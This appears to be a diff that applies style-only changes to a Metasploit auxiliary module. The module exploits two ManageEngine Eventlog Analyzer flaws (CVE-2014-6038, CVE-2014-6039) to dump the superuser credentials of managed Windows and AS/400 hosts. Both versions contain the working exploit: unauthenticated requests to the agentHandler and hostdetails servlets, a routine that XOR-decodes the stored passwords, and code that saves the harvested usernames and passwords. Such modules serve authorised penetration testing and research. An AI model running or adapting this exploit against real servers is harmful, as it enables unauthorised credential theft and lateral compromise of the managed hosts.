@@ -1,3 +1,4 @@
+# frozen_string_literal: true
 ##
 # This module requires Metasploit: http://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
@@ -7,44 +8,43 @@ require 'msf/core'
 require 'rexml/document'
 
 class MetasploitModule < Msf::Auxiliary
-
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
 
   def initialize(info = {})
     super(update_info(info,
-      'Name' => 'ManageEngine Eventlog Analyzer Managed Hosts Administrator Credential Disclosure',
-      'Description' => %q{
-        ManageEngine Eventlog Analyzer from v7 to v9.9 b9002 has two security vulnerabilities that
-        allow an unauthenticated user to obtain the superuser password of any managed Windows and
-        AS/400 hosts. This module abuses both vulnerabilities to collect all the available
-        usernames and passwords. First the agentHandler servlet is abused to get the hostid and
-        slid of each device (CVE-2014-6038); then these numeric IDs are used to extract usernames
-        and passwords by abusing the hostdetails servlet (CVE-2014-6039). Note that on version 7,
-        the TARGETURI has to be prepended with /event.
-      },
-      'Author' =>
-        [
-          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
-        ],
-      'License' => MSF_LICENSE,
-      'References' =>
-        [
-          [ 'CVE', '2014-6038' ],
-          [ 'CVE', '2014-6039' ],
-          [ 'OSVDB', '114342' ],
-          [ 'OSVDB', '114344' ],
-          [ 'URL', 'http://seclists.org/fulldisclosure/2014/Nov/12' ]
-        ],
-      'DisclosureDate' => 'Nov 5 2014'))
+                      'Name' => 'ManageEngine Eventlog Analyzer Managed Hosts Administrator Credential Disclosure',
+                      'Description' => %q{
+                        ManageEngine Eventlog Analyzer from v7 to v9.9 b9002 has two security vulnerabilities that
+                        allow an unauthenticated user to obtain the superuser password of any managed Windows and
+                        AS/400 hosts. This module abuses both vulnerabilities to collect all the available
+                        usernames and passwords. First the agentHandler servlet is abused to get the hostid and
+                        slid of each device (CVE-2014-6038); then these numeric IDs are used to extract usernames
+                        and passwords by abusing the hostdetails servlet (CVE-2014-6039). Note that on version 7,
+                        the TARGETURI has to be prepended with /event.
+                      },
+                      'Author' =>
+                        [
+                          'Pedro Ribeiro <pedrib[at]gmail.com>' # Vulnerability discovery and MSF module
+                        ],
+                      'License' => MSF_LICENSE,
+                      'References' =>
+                        [
+                          [ 'CVE', '2014-6038' ],
+                          [ 'CVE', '2014-6039' ],
+                          [ 'OSVDB', '114342' ],
+                          [ 'OSVDB', '114344' ],
+                          [ 'URL', 'http://seclists.org/fulldisclosure/2014/Nov/12' ]
+                        ],
+                      'DisclosureDate' => 'Nov 5 2014'))
 
     register_options(
       [
         Opt::RPORT(8400),
-        OptString.new('TARGETURI', [ true,  'Eventlog Analyzer application URI (should be /event for version 7)', '/']),
-      ], self.class)
+        OptString.new('TARGETURI', [ true, 'Eventlog Analyzer application URI (should be /event for version 7)', '/'])
+      ], self.class
+    )
   end
-
 
   def decode_password(encoded_password)
     password_xor = Rex::Text.decode_base64(encoded_password)
@@ -52,19 +52,16 @@ class MetasploitModule < Msf::Auxiliary
     password_xor.bytes.each do |byte|
       password << (byte ^ 0x30)
     end
-    return password
+    password
   end
 
-
   def run
-    res = send_request_cgi({
-      'uri' => normalize_uri(target_uri.path, 'agentHandler'),
-      'method' =>'GET',
-      'vars_get' => {
-        'mode' => 'getTableData',
-        'table' => 'HostDetails'
-      }
-    })
+    res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'agentHandler'),
+                           'method' => 'GET',
+                           'vars_get' => {
+                             'mode' => 'getTableData',
+                             'table' => 'HostDetails'
+                           })
 
     unless res && res.code == 200
       fail_with(Failure::NotFound, "#{peer} - Failed to reach agentHandler servlet")
@@ -74,7 +71,7 @@ class MetasploitModule < Msf::Auxiliary
     # When passwords have digits the XML parsing will fail.
     # Replace with an empty password attribute so that we know the device has a password
     # and therefore we want to add it to our host list.
-    xml = res.body.to_s.gsub(/&#[0-9]*;/,Rex::Text.rand_text_alpha(6))
+    xml = res.body.to_s.gsub(/&#[0-9]*;/, Rex::Text.rand_text_alpha(6))
     begin
       doc = REXML::Document.new(xml)
     rescue
@@ -83,11 +80,10 @@ class MetasploitModule < Msf::Auxiliary
 
     slid_host_ary = []
     doc.elements.each('Details/HostDetails') do |ele|
-      if ele.attributes['password']
-        # If an element doesn't have a password, then we don't care about it.
-        # Otherwise store the slid and host_id to use later.
-        slid_host_ary << [ele.attributes['slid'], ele.attributes['host_id']]
-      end
+      next unless ele.attributes['password']
+      # If an element doesn't have a password, then we don't care about it.
+      # Otherwise store the slid and host_id to use later.
+      slid_host_ary << [ele.attributes['slid'], ele.attributes['host_id']]
     end
 
     cred_table = Rex::Text::Table.new(
@@ -100,19 +96,17 @@ class MetasploitModule < Msf::Auxiliary
           'SubType',
           'Domain',
           'Username',
-          'Password',
+          'Password'
         ]
     )
 
     slid_host_ary.each do |host|
-      res = send_request_cgi({
-        'uri' => normalize_uri(target_uri.path, 'hostdetails'),
-        'method' =>'GET',
-        'vars_get' => {
-          'slid' => host[0],
-          'hostid' => host[1]
-        }
-      })
+      res = send_request_cgi('uri' => normalize_uri(target_uri.path, 'hostdetails'),
+                             'method' => 'GET',
+                             'vars_get' => {
+                               'slid' => host[0],
+                               'hostid' => host[1]
+                             })
 
       unless res && res.code == 200
         fail_with(Failure::NotFound, "#{peer} - Failed to reach hostdetails servlet")
@@ -121,7 +115,7 @@ class MetasploitModule < Msf::Auxiliary
       begin
         doc = REXML::Document.new(res.body)
       rescue
-        fail_with(Failure::Unknown, "#{peer} - Error parsing the XML, dumping output #{res.body.to_s}")
+        fail_with(Failure::Unknown, "#{peer} - Error parsing the XML, dumping output #{res.body}")
       end
 
       doc.elements.each('Details/Hosts') do |ele|
@@ -161,10 +155,8 @@ class MetasploitModule < Msf::Auxiliary
             next
           end
 
-          credential_core = report_credential_core({
-             password: password,
-             username: username,
-           })
+          credential_core = report_credential_core(password: password,
+                                                   username: username)
 
           host_login_data = {
             address: host_ipaddress,
@@ -181,7 +173,7 @@ class MetasploitModule < Msf::Auxiliary
     end
 
     print_line
-    print_line("#{cred_table}")
+    print_line(cred_table.to_s)
     loot_name     = 'manageengine.eventlog.managed_hosts.creds'
     loot_type     = 'text/csv'
     loot_filename = 'manageengine_eventlog_managed_hosts_creds.csv'
@@ -192,12 +184,12 @@ class MetasploitModule < Msf::Auxiliary
       rhost,
       cred_table.to_csv,
       loot_filename,
-      loot_desc)
+      loot_desc
+    )
     print_status "Credentials saved in: #{p}"
   end
 
-
-  def report_credential_core(cred_opts={})
+  def report_credential_core(cred_opts = {})
     # Set up the has for our Origin service
     origin_service_data = {
       address: rhost,
@@ -209,7 +201,7 @@ class MetasploitModule < Msf::Auxiliary
 
     credential_data = {
       origin_type: :service,
-      module_fullname: self.fullname,
+      module_fullname: fullname,
       private_type: :password,
       private_data: cred_opts[:password],
       username: cred_opts[:username]
